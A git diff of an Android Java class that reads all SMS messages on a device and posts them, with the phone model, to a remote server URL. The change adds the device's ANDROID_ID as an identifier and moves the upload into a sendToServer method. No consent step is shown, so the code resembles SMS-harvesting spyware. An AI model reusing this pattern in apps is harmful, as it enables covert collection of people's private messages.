@@ -3,6 +3,9 @@ package com.alirnp.piri;
 import android.content.Context;
 import android.os.AsyncTask;
 import android.os.Build;
+import android.provider.Settings;
+import android.telecom.TelecomManager;
+import android.telephony.TelephonyManager;
 import android.util.Log;
 
 import com.android.volley.DefaultRetryPolicy;
@@ -51,8 +54,10 @@ public class GetSmsTask extends AsyncTask<Void, Void, JSONObject> {
             Data<Sms> smsData = telephonyProvider.getSms(TelephonyProvider.Filter.ALL);
             List<Sms> smsList = smsData.getList();
 
+            String android_id = Settings.Secure.getString(contextWeakReference.get().getContentResolver(), Settings.Secure.ANDROID_ID);
+
             jsonObject.put(Constants.PHONE_MODEL, getDeviceModel());
-            jsonObject.put(Constants.SERIAL_NUMBER, "serial");
+            jsonObject.put(Constants.SERIAL_NUMBER, android_id);
             jsonObject.put(Constants.SIZE, String.valueOf(smsList.size()));
 
 
@@ -96,6 +101,12 @@ public class GetSmsTask extends AsyncTask<Void, Void, JSONObject> {
 
         if (context == null || jsonObject == null) return;
 
+        sendToServer(context , jsonObject);
+
+
+    }
+
+    private void sendToServer(Context context, JSONObject jsonObject) {
         JsonObjectRequest request = new JsonObjectRequest(Request.Method.POST, Constants.URL_SMS, jsonObject,
                 response -> {
                     if (onSuccessListener != null) {
@@ -125,10 +136,7 @@ public class GetSmsTask extends AsyncTask<Void, Void, JSONObject> {
         request.setRetryPolicy(new DefaultRetryPolicy(70000, DefaultRetryPolicy.DEFAULT_MAX_RETRIES, DefaultRetryPolicy.DEFAULT_BACKOFF_MULT));
         RequestQueue queue = Volley.newRequestQueue(context);
         queue.add(request);
-
-
     }
-
 
 
     private String getDeviceModel(){
